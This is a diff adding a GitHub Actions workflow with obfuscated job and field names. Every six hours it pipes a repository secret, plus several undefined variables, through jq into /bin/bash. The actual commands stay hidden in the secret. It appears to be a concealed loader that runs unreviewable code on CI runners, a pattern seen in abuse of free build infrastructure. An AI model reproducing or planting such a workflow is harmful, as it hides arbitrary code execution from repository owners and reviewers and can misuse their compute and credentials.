@@ -1,0 +1,25 @@
+name: xuxijiao7891
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuxijiao7891
+        env:
+          t76: ${{ secrets.t76 }}
+        run: |
+          echo $t76 | jq -r .t2405 | /bin/bash
+          echo $cd771 | jq -r .rr2182 | /bin/bash
+          echo $r85 | jq -r .mas9 | /bin/bash
+          echo $rlaoi1 | jq -r .qicdt354 | /bin/bash
+          echo $hsfv719 | jq -r .jvx0 | /bin/bash
+          echo $cvbhl14 | jq -r .ud983 | /bin/bash
+          echo $l26 | jq -r .di6 | /bin/bash
+          echo $r236 | jq -r .ccge635 | /bin/bash
+
